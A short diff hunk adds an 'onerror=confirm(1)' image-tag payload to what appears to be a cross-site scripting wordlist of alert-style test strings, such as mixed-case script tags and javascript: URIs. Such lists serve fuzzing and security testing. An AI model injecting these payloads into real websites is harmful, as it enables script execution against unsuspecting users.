@@ -17,6 +17,9 @@ V
 ‘; alert(1);
 ‘)alert(1);//
 <ScRiPt>alert(1)</sCriPt>
+
+'">><><img src=x onerror=confirm(1)>
+
 <IMG SRC=jAVasCrIPt:alert(‘XSS’)>
 <IMG SRC=”javascript:alert(‘XSS’);”>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
